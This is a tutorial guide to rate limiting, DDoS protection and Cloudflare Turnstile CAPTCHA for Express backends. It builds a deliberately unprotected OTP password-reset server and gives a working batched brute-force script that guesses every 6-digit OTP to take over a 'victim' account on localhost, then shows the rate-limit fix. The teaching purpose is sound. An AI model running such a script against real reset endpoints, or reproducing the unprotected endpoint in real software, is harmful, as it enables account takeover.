# Rate Limiting, DDoS Protection & CAPTCHA

## Complete Guide to Backend Security Mechanisms

## Table of Contents

1. [Introduction](#introduction)
2. [Rate Limiting](#rate-limiting)
   - [Definition](#definition)
   - [Why Rate Limiting?](#why-rate-limiting)
   - [Where to Apply Rate Limiting](#where-to-apply-rate-limiting)
   - [Rate Limiting Conditions](#rate-limiting-conditions)
   - [Implementation Levels](#implementation-levels)
3. [Common Attack Vectors](#common-attack-vectors)
   - [Brute Force Attacks](#brute-force-attacks)
   - [OTP Brute Force Attack](#otp-brute-force-attack)
4. [Practical Implementation](#practical-implementation)
   - [Backend Setup](#backend-setup)
   - [Creating the Attack Script](#creating-the-attack-script)
   - [Request Batching](#request-batching)
   - [Implementing Rate Limiting Protection](#implementing-rate-limiting-protection)
5. [DDoS Attacks](#ddos-attacks)
   - [What is DDoS?](#what-is-ddos)
   - [Why Attackers Perform DDoS](#why-attackers-perform-ddos)
   - [DDoS Protection with Cloudflare](#ddos-protection-with-cloudflare)
6. [CAPTCHA](#captcha)
   - [What is CAPTCHA?](#what-is-captcha)
   - [When to Use CAPTCHA](#when-to-use-captcha)
   - [Implementing Cloudflare Turnstile](#implementing-cloudflare-turnstile)
7. [Architecture Diagrams](#architecture-diagrams)
8. [Best Practices Summary](#best-practices-summary)
9. [Quick Reference](#quick-reference)

---

## Introduction

When building web applications that scale, security becomes paramount. Three critical security mechanisms that every backend developer must understand are:

| Mechanism | Purpose | When Needed |
|-----------|---------|-------------|
| **Rate Limiting** | Control request frequency | Always (at scale) |
| **DDoS Protection** | Prevent distributed attacks | When you become a target |
| **CAPTCHA** | Verify human users | Sensitive endpoints |

These become crucial when:
- Your application raises funding and becomes visible
- You gain attention from malicious actors
- Your service handles sensitive operations (payments, authentication)
- You experience high traffic events (ticket sales, NFT mints)

## Rate Limiting

### Definition

**Rate Limiting** is a technique used to control the number of requests a user, IP address, or system can make to a server within a specified time window.

```
Rate Limiting = Limiting the number of requests that can come from:
├── A specific IP address
├── A specific User ID
├── A specific API key
└── Any identifiable entity
```

### Why Rate Limiting?


#### Detailed Reasons:

| Reason | Description | Example |
|--------|-------------|---------|
| **Preventing Overload** | Controls how often a user/system can make requests | Stopping a user from making 1000s of login attempts per minute |
| **Mitigating Abuse** | Reduces feasibility of attacks | Blocking brute force password attempts |
| **Managing Traffic** | Handles high-traffic scenarios | Ticket sales for popular events, ensuring fair access |
| **DDoS Protection** | Limited protection against single-source attacks | Note: Not effective against distributed attacks |

### Where to Apply Rate Limiting

#### General Application Rate Limits (Lenient)

For general endpoints, apply lenient rate limits:

| Setting | Typical Value | Purpose |
|---------|---------------|---------|
| Window | 10 seconds | Time frame for counting requests |
| Max Requests | 100-1000 | Normal user behavior threshold |

> **Reasoning**: When you open a network tab on any website, you'll see hundreds of requests going out initially. Normal users need flexibility.

#### Aggressive Rate Limits (Strict)

For sensitive endpoints, apply strict limits:

| Endpoint Type | Window | Max Requests | Reason |
|---------------|--------|--------------|--------|
| Password Reset | 15 minutes | 3-5 | Prevent brute force |
| OTP Verification | 5 minutes | 3-5 | Block OTP guessing |
| Login | 15 minutes | 10 | Prevent credential stuffing |
| Sign Up | 1 hour | 5 | Prevent spam accounts |


### Rate Limiting Conditions

Rate limiting can be applied based on different identifiers:


#### IP-Based Rate Limiting Considerations

**The Shared IP Problem:**

In environments like:
- College campuses
- Corporate networks
- Residential areas with NAT

Multiple users share the same public IP. If one user triggers rate limits, everyone gets blocked.


### Implementation Levels

Rate limiting can be implemented at two primary levels:


#### Comparison Table

| Aspect | Application Level | Infrastructure Level |
|--------|-------------------|---------------------|
| **Location** | Express/Node.js server | Load Balancer/CDN |
| **Request Processing** | Request reaches application | Blocked before application |
| **Implementation** | `express-rate-limit` | Cloudflare WAF, AWS Shield |
| **Flexibility** | High (per-endpoint control) | Medium |
| **Server Load** | Higher (processes all requests) | Lower (early rejection) |
| **Cost** | Free | Often paid services |

## Common Attack Vectors

### Brute Force Attacks

**Definition**: A brute force attack involves trying every possible combination until the correct one is found.

#### Password Brute Force Flow


### OTP Brute Force Attack

This is a critical vulnerability that earned bug bounty hunter Anand Prakash a significant reward from Facebook.

#### Attack Scenario


#### Mathematical Analysis

For a 6-digit OTP:

$$
\text{Total Possible OTPs} = 10^6 = 1,000,000
$$

Without rate limiting, if an attacker can send 100 requests/second:

$$
\text{Time to exhaust all OTPs} = \frac{1,000,000}{100} = 10,000 \text{ seconds} ≈ 2.78 \text{ hours}
$$

With aggressive rate limiting (5 requests per 15 minutes):

$$
\text{Time to exhaust all OTPs} = \frac{1,000,000}{5} \times 15 \text{ minutes} = 3,000,000 \text{ minutes} ≈ 5.7 \text{ years}
$$

This demonstrates why aggressive rate limiting on OTP endpoints is critical!

## Practical Implementation

### Backend Setup

#### Project Structure

```
backend/
├── src/
│   └── index.ts
├── package.json
└── tsconfig.json
```

#### Initial Setup Commands

```bash
# Initialize project
mkdir backend && cd backend
npm init -y
npx tsc --init

# Update tsconfig.json
# Set: "rootDir": "./src"
# Set: "outDir": "./dist"

# Install dependencies
npm i express @types/express
```

#### Vulnerable Backend Code (Before Rate Limiting)

```typescript
import express from 'express';

const app = express();
const PORT = 3000;

app.use(express.json());

// In-memory OTP store (use database in production!)
const otpStore: Record<string, string> = {};

/**
 * Generate OTP Endpoint
 * Called when user clicks "Forgot Password" → "Reset Password"
 */
app.post('/generate-otp', (req, res) => {
  const email = req.body.email;
  
  if (!email) {
    return res.status(400).json({ message: "Email is required" });
  }
  
  // Generate 6-digit OTP
  const otp = Math.floor(100000 + Math.random() * 900000).toString();
  otpStore[email] = otp;

  console.log(`OTP for ${email}: ${otp}`); // In production: send via email
  res.status(200).json({ message: "OTP generated and logged" });
});

/**
 * Reset Password Endpoint
 * ⚠️ VULNERABLE: No rate limiting!
 */
app.post('/reset-password', (req, res) => {
  const { email, otp, newPassword } = req.body;
  
  if (!email || !otp || !newPassword) {
    return res.status(400).json({ 
      message: "Email, OTP, and new password are required" 
    });
  }
  
  if (otpStore[email] === otp) {
    console.log(`Password for ${email} reset to: ${newPassword}`);
    delete otpStore[email]; // Clear OTP after use
    res.status(200).json({ message: "Password has been reset successfully" });
  } else {
    res.status(401).json({ message: "Invalid OTP" });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
```

#### OTP Generation Formula

```typescript
// Generate a random 6-digit OTP
const otp = Math.floor(100000 + Math.random() * 900000).toString();
```

Mathematical breakdown:

$$
\text{OTP} = \lfloor 100000 + \text{Math.random()} \times 900000 \rfloor
$$

Where:
- `Math.random()` returns a value in $[0, 1)$
- Minimum value: $\lfloor 100000 + 0 \times 900000 \rfloor = 100000$
- Maximum value: $\lfloor 100000 + 0.999... \times 900000 \rfloor = 999999$

This ensures we always get a 6-digit number.

### Creating the Attack Script

#### Project Setup

```bash
mkdir attack && cd attack
npm init -y
npx tsc --init
npm i axios
```

#### Attack Script with Batching

```typescript
import axios from "axios";

/**
 * Send a single reset-password request with given OTP
 */
async function sendRequest(otp: number): Promise<void> {
  const data = JSON.stringify({
    email: "victim@gmail.com",
    otp: otp.toString().padStart(6, '0'), // Ensure 6 digits
    newPassword: "hacked123"
  });

  const config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/reset-password',
    headers: {
      'Content-Type': 'application/json'
    },
    data: data
  };

  try {
    const response = await axios.request(config);
    console.log(`SUCCESS! OTP ${otp} worked!`);
    console.log(response.data);
    process.exit(0); // Stop when successful
  } catch (e) {
    // OTP was wrong, continue trying
  }
}

/**
 * Main brute force function with batching
 */
async function main(): Promise<void> {
  const BATCH_SIZE = 100; // Send 100 requests at a time
  
  for (let i = 0; i <= 999999; i += BATCH_SIZE) {
    console.log(`Testing OTPs ${i} to ${i + BATCH_SIZE - 1}...`);
    
    const promises: Promise<void>[] = [];
    
    // Create batch of promises
    for (let j = 0; j < BATCH_SIZE && (i + j) <= 999999; j++) {
      promises.push(sendRequest(i + j));
    }
    
    // Wait for all requests in batch to complete
    await Promise.all(promises);
  }
}

main();
```

### Request Batching

#### Why Batching is Necessary

```mermaid
flowchart TD
    A[Sending Requests] --> B{Approach}
    
    B --> C[All at Once]
    B --> D[One by One]
    B --> E[Batched]
    
    C --> C1["❌ Memory overflow"]
    C --> C2["1M pending promises"]
    C --> C3["Process crashes"]
    
    D --> D1["❌ Too slow"]
    D --> D2["Sequential: await each"]
    D --> D3["Takes forever"]
    
    E --> E1["✅ Optimal"]
    E --> E2["100 at a time"]
    E --> E3["Balance speed & memory"]
```



#### Batching Implementation Pattern

```typescript
// ❌ BAD: All requests at once (memory overflow)
for (let i = 0; i < 1000000; i++) {
  sendRequest(i); // No await = all promises created immediately
}

// ❌ BAD: Sequential (too slow)
for (let i = 0; i < 1000000; i++) {
  await sendRequest(i); // Waits for each request
}

// ✅ GOOD: Batched approach
async function batchedRequests() {
  const BATCH_SIZE = 100;
  
  for (let i = 0; i < 1000000; i += BATCH_SIZE) {
    const promises: Promise<void>[] = [];
    
    for (let j = 0; j < BATCH_SIZE; j++) {
      promises.push(sendRequest(i + j));
    }
    
    // Wait for batch to complete before next batch
    await Promise.all(promises);
  }
}
```

#### Understanding `Promise.all()`

```typescript
// Promise.all waits for ALL promises to resolve
const p: Promise<void>[] = [];

for (let j = 0; j < 100; j++) {
  p.push(sendRequest(i + j)); // Doesn't await individually
}

// This line waits for all 100 to complete
await Promise.all(p);

// Now safe to start next batch
```

### Implementing Rate Limiting Protection

#### Install Dependencies

```bash
npm i express-rate-limit
```

#### Protected Backend Code

```typescript
import express from 'express';
import rateLimit from 'express-rate-limit';

const app = express();
const PORT = 3000;

app.use(express.json());

/**
 * Rate limiter for OTP generation
 * Lenient: 3 requests per 5 minutes
 */
const otpLimiter = rateLimit({
  windowMs: 5 * 60 * 1000, // 5 minutes in milliseconds
  max: 3, // Max 3 requests per window
  message: 'Too many OTP requests, please try again after 5 minutes',
  standardHeaders: true, // Return rate limit info in headers
  legacyHeaders: false,  // Disable deprecated headers
});

/**
 * Rate limiter for password reset
 * Aggressive: 5 requests per 15 minutes
 */
const passwordResetLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // Max 5 attempts per window
  message: 'Too many password reset attempts, please try again after 15 minutes',
  standardHeaders: true,
  legacyHeaders: false,
});

// In-memory OTP store
const otpStore: Record<string, string> = {};

/**
 * Generate OTP - Protected with rate limiting
 */
app.post('/generate-otp', otpLimiter, (req, res) => {
  const email = req.body.email;
  
  if (!email) {
    return res.status(400).json({ message: "Email is required" });
  }
  
  const otp = Math.floor(100000 + Math.random() * 900000).toString();
  otpStore[email] = otp;

  console.log(`OTP for ${email}: ${otp}`);
  res.status(200).json({ message: "OTP generated and logged" });
});

/**
 * Reset Password - Protected with aggressive rate limiting
 */
app.post('/reset-password', passwordResetLimiter, (req, res) => {
  const { email, otp, newPassword } = req.body;

  if (!email || !otp || !newPassword) {
    return res.status(400).json({ 
      message: "Email, OTP, and new password are required" 
    });
  }
  
  if (Number(otpStore[email]) === Number(otp)) {
    console.log(`Password for ${email} reset to: ${newPassword}`);
    delete otpStore[email];
    res.status(200).json({ message: "Password has been reset successfully" });
  } else {
    res.status(401).json({ message: "Invalid OTP" });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
```

#### express-rate-limit Configuration Options

| Option | Description | Example |
|--------|-------------|---------|
| `windowMs` | Time window in milliseconds | `15 * 60 * 1000` (15 min) |
| `max` | Maximum requests per window | `100` |
| `message` | Response message when limited | `"Too many requests"` |
| `standardHeaders` | Return `RateLimit-*` headers | `true` |
| `legacyHeaders` | Use `X-RateLimit-*` headers | `false` |
| `keyGenerator` | Custom key function | `(req) => req.ip` |
| `skip` | Skip certain requests | `(req) => whitelist.includes(req.ip)` |

---

## DDoS Attacks

### What is DDoS?

**DDoS (Distributed Denial of Service)** is an attack where multiple compromised systems flood a target with traffic, making it unavailable to legitimate users.


#### DDoS vs Rate Limiting

| Aspect | Rate Limiting | DDoS Attack |
|--------|---------------|-------------|
| **Source** | Single IP/User | Multiple distributed IPs |
| **Protection** | Block single source | Must block many sources |
| **Effectiveness** | High against single source | Rate limiting alone is NOT enough |
| **Solution** | `express-rate-limit` | Cloudflare, AWS Shield, etc. |

```
Rate Limiting Scenario:
┌──────────┐
│ Attacker │ ──[1000 req/s]──> [Rate Limit] ──> ✅ Blocked
│  (1 IP)  │
└──────────┘

DDoS Scenario:
┌──────────┐
│ Attacker │ ──[10 req/s]──┐
│  (IP 1)  │               │
└──────────┘               │
┌──────────┐               │
│ Attacker │ ──[10 req/s]──┼──> [Rate Limit] ──> ❌ Still gets through!
│  (IP 2)  │               │     (per-IP)
└──────────┘               │
    ...      ──[10 req/s]──┘
  (1000s of IPs)

Each IP is under the rate limit, but combined traffic overwhelms server!
```

### Why Attackers Perform DDoS

| Reason | Description | Example |
|--------|-------------|---------|
| **Ransom** | Demand payment to stop attack | "Pay $10,000 BTC or attacks continue" |
| **Competition** | Take down competitor during key events | Sneaker drop, NFT mint |
| **Hacktivism** | Political or ideological motivation | Protest against organization |
| **Distraction** | Cover for other attacks | Data breach while IT focused on DDoS |

#### Real-World Scenarios

1. **Sneaker Drops**: Block legitimate buyers to gain advantage
2. **NFT Mints**: Overwhelm server so only attacker's requests succeed
3. **Ticket Sales**: Block others from buying limited tickets
4. **IPL Match Tickets**: India vs Pakistan World Cup tickets

### How DDoS Botnets Work

```mermaid
flowchart TD
    A[Attacker Controller] --> B[Command & Control Server]
    
    B --> C1[Compromised PC 1]
    B --> C2[Compromised PC 2]
    B --> C3[Compromised IoT Device]
    B --> C4[Malware-infected Server]
    B --> C5[... Thousands more]
    
    C1 --> T[Target Website]
    C2 --> T
    C3 --> T
    C4 --> T
    C5 --> T
    
    T --> Down["🔥 Website Down"]
```



**How attackers get thousands of machines:**
1. **Malware/Ransomware**: Infects computers silently
2. **IoT Botnets**: Compromised smart devices
3. **Rented Botnets**: DDoS-as-a-Service on dark web
4. **Volunteer Networks**: Hacktivism (e.g., LOIC)

### DDoS Protection with Cloudflare

#### How Cloudflare Works


#### Cloudflare Browser Check Page

When Cloudflare suspects DDoS or bot activity, users see:

```
┌────────────────────────────────────────────────────┐
│                                                    │
│         ● ● ●                                      │
│                                                    │
│  Checking your browser before accessing           │
│  yourwebsite.com                                   │
│                                                    │
│  This process is automatic. Your browser will     │
│  redirect to your requested content shortly.      │
│                                                    │
│  Please allow up to 5 seconds...                  │
│                                                    │
│  DDoS protection by Cloudflare                    │
│  Ray ID: 5e6151ab79b0d629                         │
│                                                    │
└────────────────────────────────────────────────────┘
```

#### Setting Up Cloudflare DDoS Protection


**Steps:**

1. **Transfer Domain to Cloudflare**
   - Go to cloudflare.com
   - Add your site
   - Update nameservers at your registrar

2. **Add DNS Records**
   ```
   Type: A
   Name: @ (or subdomain)
   Content: Your server IP (e.g., 1.2.3.4)
   Proxy: ✅ Enabled (Orange cloud)
   ```

3. **Verify Proxy is Working**
   ```bash
   # Check what IP your domain resolves to
   ping yourdomain.com
   
   # Should show Cloudflare IP, NOT your server IP!
   # Example: 104.21.x.x (Cloudflare)
   # NOT: 1.2.3.4 (Your actual server)
   ```

#### IP Address Comparison

| Without Cloudflare | With Cloudflare |
|--------------------|-----------------|
| Domain → Your Server IP | Domain → Cloudflare IP → Your Server |
| `ping site.com` → `1.2.3.4` | `ping site.com` → `104.21.x.x` |
| Direct attack possible | Protected by Cloudflare |

---

## CAPTCHA

### What is CAPTCHA?

**CAPTCHA** (Completely Automated Public Turing test to tell Computers and Humans Apart) is a challenge-response test to determine if the user is human.

```mermaid
flowchart TD
    A[User Action] --> B{Is this a human?}
    
    B --> C[Show Challenge]
    C --> D{Solved Correctly?}
    
    D -->|Yes| E[Generate Token]
    D -->|No| F[Block / Retry]
    
    E --> G[Send Token to Backend]
    G --> H{Verify with CAPTCHA Provider}
    
    H -->|Valid| I[✅ Allow Action]
    H -->|Invalid| J[❌ Reject Action]
```



### When to Use CAPTCHA

| Use Case | Reason |
|----------|--------|
| **Login/Sign-up** | Prevent automated account creation/access |
| **Password Reset** | Verify human is requesting reset |
| **Payment Forms** | Prevent automated fraud |
| **Contact Forms** | Block spam submissions |
| **Admin Actions** | Extra security for sensitive operations |

### CAPTCHA vs Rate Limiting vs DDoS Protection

| Feature | CAPTCHA | Rate Limiting | DDoS Protection |
|---------|---------|---------------|-----------------|
| **Purpose** | Verify human | Limit frequency | Block flood attacks |
| **How it works** | Challenge-response | Count requests | Traffic analysis |
| **Blocks bots?** | Yes (theoretically) | Partially | Yes (patterns) |
| **User experience** | Friction (challenges) | Transparent | Minimal |
| **When needed** | Sensitive actions | Always | When attacked |

### How CAPTCHA Verification Works


### Implementing Cloudflare Turnstile

#### Step 1: Create Turnstile Site

1. Go to Cloudflare Dashboard → Turnstile
2. Add a site
3. Get your **Site Key** (public) and **Site Secret** (private)

```
┌─────────────────────────────────────────┐
│ Turnstile Site Configuration            │
├─────────────────────────────────────────┤
│ Site Name: my-app-prod                  │
│ Domain: localhost, myapp.com            │
│                                         │
│ Site Key: 0x4AAAAAAAXtEe2JIeAEUcjX     │ ← Use in frontend
│ Site Secret: 0x4AAAAAAAXtEe2JIe...     │ ← Use in backend (KEEP SECRET!)
└─────────────────────────────────────────┘
```

#### Step 2: Frontend Implementation (React)

```bash
npm install @marsidev/react-turnstile axios
```

```tsx
import { Turnstile } from '@marsidev/react-turnstile';
import axios from 'axios';
import { useState } from 'react';

function PasswordResetForm() {
  const [token, setToken] = useState<string>("");
  const [otp, setOtp] = useState<string>("");
  const [newPassword, setNewPassword] = useState<string>("");

  const handleSubmit = async () => {
    if (!token) {
      alert("Please complete the CAPTCHA");
      return;
    }

    try {
      const response = await axios.post("http://localhost:3000/reset-password", {
        email: "user@example.com",
        otp: otp,
        newPassword: newPassword,
        token: token, // Include CAPTCHA token!
      });
      alert("Password reset successful!");
    } catch (error) {
      alert("Password reset failed");
    }
  };

  return (
    <div>
      <input 
        placeholder="Enter OTP"
        value={otp}
        onChange={(e) => setOtp(e.target.value)}
      />
      
      <input 
        type="password"
        placeholder="New Password"
        value={newPassword}
        onChange={(e) => setNewPassword(e.target.value)}
      />

      {/* Turnstile CAPTCHA Widget */}
      <Turnstile 
        siteKey="0x4AAAAAAAXtEe2JIeAEUcjX"
        onSuccess={(token) => setToken(token)}
        onError={() => console.error("CAPTCHA error")}
      />

      <button onClick={handleSubmit}>
        Update Password
      </button>
    </div>
  );
}

export default PasswordResetForm;
```

#### Step 3: Backend Verification

```typescript
import express from 'express';
import cors from 'cors';

const app = express();
const PORT = 3000;
const SECRET_KEY = "your_site_secret_from_cloudflare";

app.use(express.json());
app.use(cors());

const otpStore: Record<string, string> = {};

/**
 * Verify Turnstile CAPTCHA token with Cloudflare
 */
async function verifyCaptcha(token: string): Promise<boolean> {
  const formData = new FormData();
  formData.append('secret', SECRET_KEY);
  formData.append('response', token);

  const url = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
  
  try {
    const result = await fetch(url, {
      body: formData,
      method: 'POST',
    });
    
    const data = await result.json();
    return data.success === true;
  } catch (error) {
    console.error('CAPTCHA verification failed:', error);
    return false;
  }
}

app.post('/reset-password', async (req, res) => {
  const { email, otp, newPassword, token } = req.body;

  // Step 1: Verify CAPTCHA first
  const captchaValid = await verifyCaptcha(token);
  
  if (!captchaValid) {
    return res.status(403).json({ 
      message: "CAPTCHA verification failed" 
    });
  }

  // Step 2: Validate inputs
  if (!email || !otp || !newPassword) {
    return res.status(400).json({ 
      message: "Email, OTP, and new password are required" 
    });
  }

  // Step 3: Verify OTP
  if (Number(otpStore[email]) === Number(otp)) {
    console.log(`Password for ${email} reset to: ${newPassword}`);
    delete otpStore[email];
    res.status(200).json({ message: "Password reset successfully" });
  } else {
    res.status(401).json({ message: "Invalid OTP" });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
```

#### Turnstile API Response Format

```json
{
  "success": true,
  "challenge_ts": "2024-03-15T10:00:00.000Z",
  "hostname": "yoursite.com",
  "error-codes": [],
  "action": "",
  "cdata": ""
}
```

| Field | Description |
|-------|-------------|
| `success` | Boolean - was the challenge passed? |
| `challenge_ts` | Timestamp of challenge |
| `hostname` | Domain where challenge was solved |
| `error-codes` | Array of error codes if failed |

#### Common Error Codes

| Error Code | Meaning |
|------------|---------|
| `missing-input-secret` | Secret key not provided |
| `invalid-input-secret` | Secret key is invalid |
| `missing-input-response` | Token not provided |
| `invalid-input-response` | Token is invalid/expired |
| `timeout-or-duplicate` | Token already used or expired |

### Why Backend Verification is Essential

```mermaid
flowchart TD
    subgraph "Frontend Only (INSECURE)"
        A1[User solves CAPTCHA] --> A2[Token generated]
        A2 --> A3[Frontend validates]
        A3 --> A4["❌ Attacker can bypass!"]
        A4 --> A5[Send request without token]
        A5 --> A6[Use Postman/curl directly]
    end
    
    subgraph "With Backend Verification (SECURE)"
        B1[User solves CAPTCHA] --> B2[Token generated]
        B2 --> B3[Frontend sends token + data]
        B3 --> B4[Backend verifies with Cloudflare]
        B4 --> B5{Valid?}
        B5 -->|Yes| B6["✅ Process request"]
        B5 -->|No| B7["❌ Reject (403)"]
    end
```



**Why frontend-only is insecure:**
1. Attacker can use Postman/curl to send requests
2. Attacker can modify JavaScript to skip CAPTCHA
3. Button disable/enable can be bypassed via DevTools

**Backend verification ensures:**
1. Request came through CAPTCHA flow
2. Token is verified by trusted third party
3. Token hasn't been reused (one-time use)

---

## Architecture Diagrams

### Complete Security Architecture

```mermaid
flowchart TD
    subgraph Users["Users / Attackers"]
        U1[Legitimate User]
        U2[Brute Force Attacker]
        U3[DDoS Botnet]
    end
    
    subgraph Layer1["Layer 1: DDoS Protection"]
        CF[Cloudflare CDN]
    end
    
    subgraph Layer2["Layer 2: Infrastructure Rate Limiting"]
        WAF[Web Application Firewall]
    end
    
    subgraph Layer3["Layer 3: Application Security"]
        LB[Load Balancer]
        RL[Rate Limiter Middleware]
        CAP[CAPTCHA Verification]
    end
    
    subgraph Backend["Your Application"]
        APP[Express Server]
        DB[(Database)]
    end
    
    U1 --> CF
    U2 --> CF
    U3 --> CF
    
    CF -->|"Blocks DDoS"| WAF
    WAF -->|"IP-based rules"| LB
    LB --> RL
    RL -->|"Per-endpoint limits"| CAP
    CAP -->|"Human verified"| APP
    APP --> DB
    
    CF -.->|"❌ Blocked"| U3
    RL -.->|"❌ Rate Limited"| U2
```



### Request Flow with All Protections


---

## Best Practices Summary

### Rate Limiting Best Practices

| Practice | Description |
|----------|-------------|
| **Layered approach** | Apply at infrastructure AND application level |
| **Endpoint-specific** | Different limits for different endpoints |
| **Informative errors** | Tell users when to retry |
| **Log violations** | Track rate limit hits for analysis |
| **Whitelist trusted IPs** | Don't rate limit internal services |

### DDoS Protection Best Practices

| Practice | Description |
|----------|-------------|
| **Use CDN/Proxy** | Cloudflare, AWS CloudFront, etc. |
| **Hide origin IP** | Never expose your server's real IP |
| **Anycast network** | Distribute traffic globally |
| **Plan for attacks** | Have runbooks ready |
| **Monitor traffic** | Set up alerts for anomalies |

### CAPTCHA Best Practices

| Practice | Description |
|----------|-------------|
| **Selective use** | Only on sensitive endpoints |
| **Fallback options** | Audio CAPTCHA for accessibility |
| **Backend verify** | NEVER trust frontend-only validation |
| **Token expiry** | Tokens should be short-lived |
| **User experience** | Use invisible CAPTCHA when possible |

---

## Quick Reference

### Rate Limiting with express-rate-limit

```typescript
import rateLimit from 'express-rate-limit';

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,                  // 100 requests per window
  message: 'Too many requests',
  standardHeaders: true,
  legacyHeaders: false,
});

// Apply to all routes
app.use(limiter);

// Or specific routes
app.post('/sensitive-endpoint', strictLimiter, handler);
```

### Cloudflare Turnstile Verification

```typescript
async function verifyCaptcha(token: string): Promise<boolean> {
  const formData = new FormData();
  formData.append('secret', 'YOUR_SECRET_KEY');
  formData.append('response', token);

  const result = await fetch(
    'https://challenges.cloudflare.com/turnstile/v0/siteverify',
    { method: 'POST', body: formData }
  );
  
  const data = await result.json();
  return data.success;
}
```

### Security Checklist

```
□ Rate limiting on all endpoints (lenient)
□ Aggressive rate limiting on:
  □ Login/signup
  □ Password reset
  □ OTP verification
  □ Payment endpoints
□ Cloudflare/CDN proxy enabled
□ Origin IP hidden
□ CAPTCHA on sensitive forms
□ Backend CAPTCHA verification
□ Monitoring and alerting set up
□ Incident response plan ready
```

## Glossary

| Term | Definition |
|------|------------|
| **Rate Limiting** | Controlling request frequency from users/IPs |
| **DDoS** | Distributed Denial of Service - overwhelming a server with traffic from multiple sources |
| **CAPTCHA** | Challenge to verify human users |
| **Brute Force** | Trying all possible combinations to find correct value |
| **OTP** | One-Time Password - temporary code for authentication |
| **Botnet** | Network of compromised computers controlled by attacker |
| **WAF** | Web Application Firewall |
| **CDN** | Content Delivery Network |
| **Proxy** | Intermediate server that forwards requests |
| **Token** | Temporary credential issued after verification |


## References

- [express-rate-limit Documentation](https://www.npmjs.com/package/express-rate-limit)
- [Cloudflare Turnstile](https://developers.cloudflare.com/turnstile/)
- [Facebook OTP Bug Bounty Case Study](https://thehackernews.com/2016/03/hack-facebook-account.html)
- [OWASP Rate Limiting Guidelines](https://owasp.org/www-community/controls/Rate_Limiting)

-
